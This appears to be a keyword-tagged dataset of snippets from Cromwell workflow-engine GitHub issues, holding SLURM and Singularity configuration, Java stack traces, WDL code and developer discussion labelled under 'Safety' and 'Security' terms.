Safety,"wait \; --job-name=${job_name} \; --chdir=${cwd} \; --output=${out} \; --error=${err} \; --time=${runtime_minutes} \; ${""--cpus-per-task="" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --partition=wzhcexclu06 \; --wrap ""/bin/bash ${script}""; """""". submit-docker = """"""; # SINGULARITY_CACHEDIR needs to point to a directory accessible by; # the jobs (i.e. not lscratch). Might want to use a workflow local; # cache dir like in run.sh; source /work/share/ac7m4df1o5/bin/cromwell/set_singularity_cachedir.sh; SINGULARITY_CACHEDIR=/work/share/ac7m4df1o5/bin/cromwell/singularity-cache; source /work/share/ac7m4df1o5/bin/cromwell/test.sh ${docker}; echo ""SINGULARITY_CACHEDIR $SINGULARITY_CACHEDIR""; if [ -z $SINGULARITY_CACHEDIR ]; then; CACHE_DIR=$HOME/.singularity; else; CACHE_DIR=$SINGULARITY_CACHEDIR; fi; mkdir -p $CACHE_DIR; echo ""SINGULARITY_CACHEDIR $SINGULARITY_CACHEDIR""; LOCK_FILE=$CACHE_DIR/singularity_pull_flock. # we want to avoid all the cromwell tasks hammering each other trying; # to pull the container into the cache for the first time. flock works; # on GPFS, netapp, and vast (of course only for processes on the same; # machine which is the case here since we're pulling it in the master; # process before submitting).; #flock --exclusive --timeout 1200 $LOCK_FILE \; # singularity exec --containall docker://${docker} \; # echo ""successfully pulled ${docker}!"" &> /dev/null. # Ensure singularity is loaded if it's installed as a module; module load apps/singularity/3.7.3. # Build the Docker image into a singularity image; #IMAGE=$(echo $SINGULARITY_CACHEDIR/pull/${docker}.sif|sed ""s#:#_#g""); #singularity build $IMAGE docker://${docker}. # Submit the script to SLURM; sbatch \; --wait \; --job-name=${job_name} \; --chdir=${cwd} \; --output=${cwd}/execution/stdout \; --error=${cwd}/execution/stderr \; --time=${runtime_minutes} \; ${""--cpus-per-task="" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --partition=wzhcexclu06 \; --wrap ""singularity exec",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:8389,avoid,avoid,8389,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['avoid'],['avoid']
Safety,we are request that JES detect and terminate VMs that have zombie processes. The associated job should also be retried.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1042#issuecomment-229734691:24,detect,detect,24,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1042#issuecomment-229734691,1,['detect'],['detect']
Safety,"well-system-akka.dispatchers.engine-dispatcher-28 INFO - JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; 2019-07-21 23:34:39,131 cromwell-system-akka.dispatchers.backend-dispatcher-36 INFO - Running with 3 PAPI request workers; 2019-07-21 23:34:39,132 cromwell-system-akka.dispatchers.backend-dispatcher-36 INFO - PAPI request worker batch interval is 33333 milliseconds; 2019-07-21 23:34:39,157 cromwell-system-akka.dispatchers.backend-dispatcher-37 INFO - PAPI request worker batch interval is 33333 milliseconds; 2019-07-21 23:34:39,233 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PAPI request worker batch interval is 33333 milliseconds; ```. but then it immediately starts printing these errors:; ```; 2019-07-21 23:34:40,010 cromwell-system-akka.actor.default-dispatcher-32 ERROR - Error searching for abort requests; java.sql.SQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '""WORKFLOW_STORE_ENTRY"" where (""WORKFLOW_STATE"" = cast('Aborting' as varchar(1677' at line 1; 	at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:120); 	at com.mysql.cj.jdbc.exceptions.SQLError.createSQLException(SQLError.java:97); 	at com.mysql.cj.jdbc.exceptions.SQLExceptionsMapping.translateException(SQLExceptionsMapping.java:122); 	at com.mysql.cj.jdbc.ClientPreparedStatement.executeInternal(ClientPreparedStatement.java:970); 	at com.mysql.cj.jdbc.ClientPreparedStatement.execute(ClientPreparedStatement.java:387); 	at com.zaxxer.hikari.pool.ProxyPreparedStatement.execute(ProxyPreparedStatement.java:44); 	at com.zaxxer.hikari.pool.HikariProxyPreparedStatement.execute(HikariProxyPreparedStatement.java); 	at slick.jdbc.StatementInvoker.results(StatementInvoker.scala:38); 	at slick.jdbc.StatementInvoker.iteratorTo(StatementInvoker.scala:21); 	at slick.jdbc.Invoker.foreach(Invoker.scala:47); 	at slick.jdbc.Invoker.foreach$(Invoker.scala:",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5084:3943,Abort,Aborting,3943,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5084,1,['Abort'],['Aborting']
Safety,womtool does not detect missing inputs for sub-workflow,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3230:17,detect,detect,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3230,1,['detect'],['detect']
Safety,workflow stuck in submitted after abort,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1885:34,abort,abort,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1885,1,['abort'],['abort']
Safety,"writing all of that crap we write to logs is a nontrivial performance impact, but we like logs so we've got to do it. we have a pretty vanilla logging setup, we could be *way* smarter about things in terms of impact to performance. this would help there. . risk of dropping is small and tunable, where as one tunes the risk down so goes the performance gain (and vice versa). one of those things where if you can live with the slight possibility that any particular specific log message never makes it you're AOK.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-329791294:257,risk,risk,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1809#issuecomment-329791294,2,['risk'],['risk']
Safety,"written all the magic into, that takes some input arguments (data,; > poutputs, thresholds, etc.) and ""does the scientific thing"" to return to; > the workflow manager (cromwell) that is controlling its run via the backend.; >; > What does Singularity + Cromwell look like?; >; > People keep saying these two together, and I've been struggling to figure; > it out. I've been doing a lot of work trying to do that. What does it mean; > for Singularity to be a part of Cromwell. I first logically thought it; > would mean a backend, because the basic exec / run commands for Singularity; > don't change much (but arguments do!). But it doesn't fit well here because; > it's missing that API to make it a fully fledged service. To those familiar; > with Singularity, this is the instance command group (and not running; > containers as images). Then I thought it was really more of a workflow; > executable. But if this is the case, why is it special at all? It doesn't; > really fit because there is still going to be a lot of redundancy in; > specifying the ""singularity run bit over and over again. So I think; > (eventually) all these use cases could fit into cromwell,; >; > - running a singularity container as an executable with a backend like; > slurm; > - running a singularity container as an executable on with Local; > (host) backend; > - running a container as a backend as a container instance (via its; > API); >; > but for now, without a clean API for services, only the first two really; > make sense. Singularity is not special. It's just a binary.; > Why has it been so confusing?; >; > We get Singularity confused with Docker, because they are both containers.; > Same thing right? Sort of, but not exactly. Docker is a container; > technology, but actually it's older and has had time to develop a full API; > for services. It meets the criteria for both a backend and an executable,; > and this is because it can be conceptualized as both ""a thing that you run""; > and ""the thing th",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046:4643,redund,redundancy,4643,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-441126046,2,['redund'],['redundancy']
Safety,ws `java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor` exception when it tries to recover a running job. Stacktrace:; ```; ERROR - AwsBatchAsyncBackendJobExecutionActor [UUID(4057b0c6)generate_10gb_file.generate_file:NA:1]: Error attempting to Recover(StandardAsyncJob(4704e5c9-3a79-4280-a464-d737f36056ec)); java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:628); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:627); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.execute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:653); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recoverAsync(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:949); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.sc,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:995,recover,recover,995,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,1,['recover'],['recover']
Safety,"xt task. The next task takes in a file of files. ; The python inside the wdl is very counter-intuitive, prone to error, and unnecessary in other execution managers. See my real example below... ``` wdl; workflow crsp_validation_workflow {. ....snip....; Array[Array[File]] triplet_file_array = read_tsv(input_triplet_file_list); Float ploidy=""2"". scatter (triplet in triplet_file_array) {; ....snip.... call run_sensitivity_precision {; input:; entity_id=triplet[0],; oncotated_target_seg_gt_file = oncotate.oncotated_target_seg_gt_file,; ploidy=ploidy; }; }. call run_plot_purity_series {; input:; output_dir=""plots/"",; amp_sens_prec=run_sensitivity_precision.amp_sens_prec_file,; del_sens_prec=run_sensitivity_precision.del_sens_prec_file,; small_sens=run_sensitivity_precision.small_sens_file; }; }; ....snip....; task run_sensitivity_precision {; File oncotated_target_seg_gt_file; Float ploidy; String entity_id. command {; # Ignore chromosome 2, since the normal has this event and HCC1143T does not, so ground truth may be off, since; # detection of deletions could be reduced. Chromosome 6 may have a similar issue.; run_sensitivity_precision -i ""[2]"" ${oncotated_target_seg_gt_file} ${ploidy} ${entity_id}.sens_prec; }. output {; File amp_sens_prec_file = ""${entity_id}.sens_prec.amp.tsv""; File del_sens_prec_file = ""${entity_id}.sens_prec.del.tsv""; File small_sens_file = ""${entity_id}.sens_prec.small_segs.tsv""; File gene_segs_sens_prec_file = ""${entity_id}.sens_prec.gene_seg""; }. runtime {; docker: ""broadinstitute/eval-gatk-protected:crsp_validation_latest""; memory: ""2GB""; }; }. task run_plot_purity_series {; String output_dir; Array[File] amp_sens_prec; Array[File] del_sens_prec; Array[File] small_sens. command {; ################# HERE; python <<CODE; files = ""${sep="","" amp_sens_prec}"".split("",""); files.extend(""${sep="","" del_sens_prec}"".split("","")); with open(""sens_prec_aggregate.txt"", ""w"") as fp:; fp.write('\n'.join(files)); CODE; wc -l sens_prec_aggregate.txt. python <<CODE;",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1263:1180,detect,detection,1180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1263,1,['detect'],['detection']
Safety,"ymore; > in this case a drmaa connection would be better; > but not so sure if that still works on a start of a server; > I think there it's bound to a session; > ; > Peter van 't Hof @ffinfo Aug 26 19:11; > but only have seen the dmraa implementation inside Gatk Queue; > ; > Peter van 't Hof @ffinfo Aug 26 19:28; > when using qstat i would use it only once for the complete pool instead executing it for each job; > so then you get an output like this:; > `; > job-ID prior name user state submit/start at queue slots ja-task-ID; > 9923549 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > 9923550 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > `; > this is only 2 jobs but having a lot of jobs this will reduce the load a lot; > ; > kshakir @kshakir Aug 26 21:21; > True, Cromwell will end up in an endless loop if someone terminates the SGE job, or if the rc file doesn’t appear in general. One could use isAlive intermittently, but it was introduced mainly for recovering jobs at re-startup, & I would not have isAlive poll as often as we check for the rc file. Btw, GATK Queue actually only checks drmaa every 30 seconds, so that it doesn’t overload dispatchers. Something like isAlive could be checked with similar frequency. All this is a bigger discussion that could be tracked in a git issue.; > Separately, I am hearing from multiple people that the rc poll logs are spam. ; > ; > Peter van 't Hof @ffinfo Aug 26 21:44; > As already suggested in the PR, a actor pool would be better I think but that's not a small change indeed; > mostly jobs are running way longer that 10 or 30 sec does not matter a lot ; > ; > Peter van 't Hof @ffinfo Aug 26 21:50; > On our cluster we need something like retries but if it goes to an endless loop he will never retry. In it's current state it's for us not yet usable but If you open to it I can think/test things then there is a improvement on this. I can even try to get some time to do some developing but that I can't promise di",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348:1456,recover,recovering,1456,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348,2,['recover'],['recovering']
Safety,"…. Closes #940 . Note that the tests for aborting were already commented out, and as this would be tricky to test anyways I took that as a sign from above. I've manually verified it, however. @abaumann - this will not clean up previously stuck workflows, I'm going to provide a script or something like that to clean up the old crap, fixing those from within Cromwell was building up too many tendrils for a hack fix to something which is going to be replaced in the near future.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/986:41,abort,aborting,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/986,1,['abort'],['aborting']
Safety,…lues which caused the jobs to fail once cromwell recovered after a migration. For Develop,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2242:50,recover,recovered,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2242,1,['recover'],['recovered']
Safety,"…nate is true. It doesn't matter in run mode since it apparently uses an in-memory workflow store, but in the unlikely case in which someone sets `abort-on-terminate` to `true` in server mode, we want to set the status of all running jobs in the workflow store to `Aborting` so that when we restart the server we don't keep running those jobs. It also fixes a bug which was preventing run mode to exit properly.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2819:147,abort,abort-on-terminate,147,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2819,2,"['Abort', 'abort']","['Aborting', 'abort-on-terminate']"
Safety,👍 -- though it'd be nice to add the abort case too. [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/916/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/916#issuecomment-223408127:36,abort,abort,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/916#issuecomment-223408127,1,['abort'],['abort']
Safety,"👍 . Something to consider for the future-- a user may want to see how often their job failed due to timeouts, so it might be interesting for this to be marked as a new state other than Failed, but it works perfectly well for the goal of this PR. [![Approved with PullApprove](https://img.shields.io/badge/two_reviewers-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/4220/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-432671056:100,timeout,timeouts,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4220#issuecomment-432671056,1,['timeout'],['timeouts']
Security,"	at akka.actor.Timers.aroundReceive(Timers.scala:44); 	at akka.actor.Timers.aroundReceive$(Timers.scala:36); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); 	at akka.actor.ActorCell.invoke(ActorCell.scala:496); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2018-05-02 15:22:54,71] [[38;5;1merror[0m] bc4644da:batch_for_variantcall:-1:1: Hash error, disabling call caching for this job.; java.io.FileNotFoundException: Cannot hash file null because it can't be found; 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.usingStandardInitData$1(ConfigHashingStrategy.scala:46); 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:57); 	at cromwell.backend.impl.sfs.config.ConfigBackendFileHashingActor.customHashStrategy(ConfigBackendFileHashingActor.scala:26); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor$$anonfun$fileHashingReceive$1.applyOrElse(StandardFileHashingActor.scala:79); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:172); 	at akka.actor.Actor.aroundReceive(Actor.scala:514); 	at akka.actor.Actor.aroundReceive$(Actor.scala:512); 	at cromwell.backend.standard.callcaching.StandardFileHashingActor.akka$actor$Timers$$super$aroundReceive(StandardFileHashingActor.scala:59); 	at akka.actor.Timers.aroundReceive(Timers.scala:44); 	at akka.actor.Timers.aroundReceiv",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3584:6792,hash,hash,6792,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3584,1,['hash'],['hash']
Security,	at akka.actor.dungeon.FaultHandling.handleFailure$(FaultHandling.scala:254); 	at akka.actor.ActorCell.handleFailure(ActorCell.scala:431); 	at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:521); 	at akka.actor.ActorCell.systemInvoke(ActorCell.scala:545); 	at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: cromwell.backend.validation.ValidatedRuntimeAttributesBuilder$$anon$1: Runtime attribute validation failed:; Expecting cpu runtime attribute value greater than 0; Expecting cpuMin runtime attribute value greater than 0; 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build(ValidatedRuntimeAttributesBuilder.scala:62); 	at cromwell.backend.validation.ValidatedRuntimeAttributesBuilder.build$(ValidatedRuntimeAttributesBuilder.scala:56); 	at cromwell.backend.standard.StandardValidatedRuntimeAttributesBuilder$StandardValidatedRuntimeAttributesBuilderImpl.build(StandardValidatedRuntimeAttributesBuilder.scala:20); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes(StandardCachingActorHelper.scala:56); 	at cromwell.backend.standard.StandardCachingActorHelper.validatedRuntimeAttributes$(StandardCachingActorHelper.scala:54); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes$lzycompute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.validatedRuntimeAttributes(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardCachingActorHelper.startMetadataK,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4591:5997,validat,validation,5997,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4591,1,['validat'],['validation']
Security,	at java.nio.channels.Channels$1.close(Channels.java:178); 	at java.nio.file.Files.write(Files.java:3300); 	at better.files.File.writeByteArray(File.scala:269); 	at better.files.File.write(File.scala:279); 	at cromwell.core.path.BetterFileMethods$class.write(BetterFileMethods.scala:179); 	at cromwell.filesystems.gcs.GcsPath.write(GcsPathBuilder.scala:101); 	at cromwell.engine.io.nio.NioFlow$$anonfun$write$1.apply$mcV$sp(NioFlow.scala:53); 	at cromwell.engine.io.nio.NioFlow$$anonfun$write$1.apply(NioFlow.scala:52); 	at cromwell.engine.io.nio.NioFlow$$anonfun$write$1.apply(NioFlow.scala:52); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); 	... 6 more; Caused by: javax.net.ssl.SSLException: Connection has been shutdown: javax.net.ssl.SSLException: java.net.SocketException: Broken pipe; 	at sun.security.ssl.SSLSocketImpl.checkEOF(SSLSocketImpl.java:1541); 	at sun.security.ssl.AppInputStream.read(AppInputStream.java:95); 	at java.io.BufferedInputStream.fill(BufferedInputStream.java:246); 	at java.io.BufferedInputStream.read1(BufferedInputStream.java:286); 	at java.io.BufferedInputStream.read(BufferedInputStream.java:345); 	at sun.net.www.http.HttpClient.parseHTTPHeader(HttpClient.java:704); 	at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); 	at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); 	at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); 	at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); 	at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94); 	at com.google.api.client.http.HttpRequest.execute(HttpRequest.jav,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2183:4222,secur,security,4222,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2183,1,['secur'],['security']
Security,	at wdl4s.WdlNamespace$$anonfun$17.apply(WdlNamespace.scala:208); 	at wdl4s.WdlNamespace$$anonfun$17.apply(WdlNamespace.scala:207); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.immutable.List.foreach(List.scala:381); 	at scala.collection.TraversableLike$class.map(TraversableLike.scala:234); 	at scala.collection.immutable.List.map(List.scala:285); 	at wdl4s.WdlNamespace$.apply(WdlNamespace.scala:207); 	at wdl4s.WdlNamespace$.wdl4s$WdlNamespace$$load(WdlNamespace.scala:177); 	at wdl4s.WdlNamespace$.loadUsingSource(WdlNamespace.scala:173); 	at wdl4s.WdlNamespaceWithWorkflow$.load(WdlNamespace.scala:542); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$validateNamespaceWithImports$1.apply(MaterializeWorkflowDescriptorActor.scala:363); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$validateNamespaceWithImports$1.apply(MaterializeWorkflowDescriptorActor.scala:356); 	at lenthall.validation.ErrorOr$ShortCircuitingFlatMap$.flatMap$extension(ErrorOr.scala:17); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.validateNamespaceWithImports(MaterializeWorkflowDescriptorActor.scala:356); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.validateNamespace(MaterializeWorkflowDescriptorActor.scala:372); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:172); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$3.applyOrElse(MaterializeWorkflowDescriptorActor.scala:132); 	at cromwell.engine.workflow.lifecycle.MaterializeWorkflowDescriptorActor$$anonfun$3.applyOrElse(MaterializeWorkflowDescriptorActor.scala:130); 	at scala.runtime.Abstra,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1958:2095,validat,validateNamespaceWithImports,2095,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1958,1,['validat'],['validateNamespaceWithImports']
Security, 	at scala.collection.TraversableOnce.sum(TraversableOnce.scala:216); 	at scala.collection.TraversableOnce.sum$(TraversableOnce.scala:216); 	at scala.collection.AbstractIterator.sum(Iterator.scala:1417); 	at better.files.File.size(File.scala:502); 	at cromwell.core.path.BetterFileMethods.size(BetterFileMethods.scala:323); 	at cromwell.core.path.BetterFileMethods.size$(BetterFileMethods.scala:323); 	at cromwell.filesystems.gcs.GcsPath.size(GcsPathBuilder.scala:179); 	at cromwell.backend.wdl.ReadLikeFunctions.$anonfun$fileSize$2(ReadLikeFunctions.scala:18); 	at scala.runtime.java8.JFunction0$mcJ$sp.apply(JFunction0$mcJ$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.wdl.ReadLikeFunctions.$anonfun$fileSize$1(ReadLikeFunctions.scala:18); 	at cromwell.backend.wdl.ReadLikeFunctions.$anonfun$validateFileSizeIsWithinLimits$1(ReadLikeFunctions.scala:54); 	at scala.util.Success.flatMap(Try.scala:247); 	at cromwell.backend.wdl.ReadLikeFunctions.validateFileSizeIsWithinLimits(ReadLikeFunctions.scala:53); 	at cromwell.backend.wdl.ReadLikeFunctions.validateFileSizeIsWithinLimits$(ReadLikeFunctions.scala:51); 	at cromwell.backend.standard.StandardExpressionFunctions.validateFileSizeIsWithinLimits(StandardExpressionFunctions.scala:22); 	at cromwell.backend.wdl.ReadLikeFunctions.read_string(ReadLikeFunctions.scala:83); 	at cromwell.backend.wdl.ReadLikeFunctions.read_string$(ReadLikeFunctions.scala:81); 	at cromwell.backend.standard.StandardExpressionFunctions.read_string(StandardExpressionFunctions.scala:22); 	at sun.reflect.GeneratedMethodAccessor360.invoke(Unknown Source); 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43); 	at java.lang.reflect.Method.invoke(Method.java:498); 	at wdl4s.wdl.expression.WdlFunctions.$anonfun$getFunction$1(WdlFunctions.scala:11); 	at wdl4s.wdl.expression.ValueEvaluator.evaluate(ValueEvaluator.scala:190); 	at wdl4s.wdl.expression.ValueEvaluator.evaluate(ValueEvaluator.scala:56); 	at wdl,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2576:6434,validat,validateFileSizeIsWithinLimits,6434,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2576,1,['validat'],['validateFileSizeIsWithinLimits']
Security, 	at sun.net.www.http.HttpClient.parseHTTP(HttpClient.java:647); 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream0(HttpURLConnection.java:1536); 	at sun.net.www.protocol.http.HttpURLConnection.getInputStream(HttpURLConnection.java:1441); 	at java.net.HttpURLConnection.getResponseCode(HttpURLConnection.java:480); 	at sun.net.www.protocol.https.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:338); 	at com.google.api.client.http.javanet.NetHttpResponse.<init>(NetHttpResponse.java:37); 	at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:94); 	at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:981); 	at com.google.cloud.storage.spi.DefaultStorageRpc.write(DefaultStorageRpc.java:564); 	... 24 more; Caused by: javax.net.ssl.SSLException: java.net.SocketException: Broken pipe; 	at sun.security.ssl.Alerts.getSSLException(Alerts.java:208); 	at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1949); 	at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1906); 	at sun.security.ssl.SSLSocketImpl.handleException(SSLSocketImpl.java:1870); 	at sun.security.ssl.SSLSocketImpl.handleException(SSLSocketImpl.java:1815); 	at sun.security.ssl.AppOutputStream.write(AppOutputStream.java:128); 	at java.io.BufferedOutputStream.flushBuffer(BufferedOutputStream.java:82); 	at java.io.BufferedOutputStream.flush(BufferedOutputStream.java:140); 	at java.io.PrintStream.flush(PrintStream.java:338); 	at java.io.FilterOutputStream.flush(FilterOutputStream.java:140); 	at com.google.api.client.http.AbstractInputStreamContent.writeTo(AbstractInputStreamContent.java:73); 	at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:79); 	... 26 more; Caused by: java.net.SocketException: Broken pipe; 	at java.net.SocketOutputStream.socketWrite0(Native Method); 	at 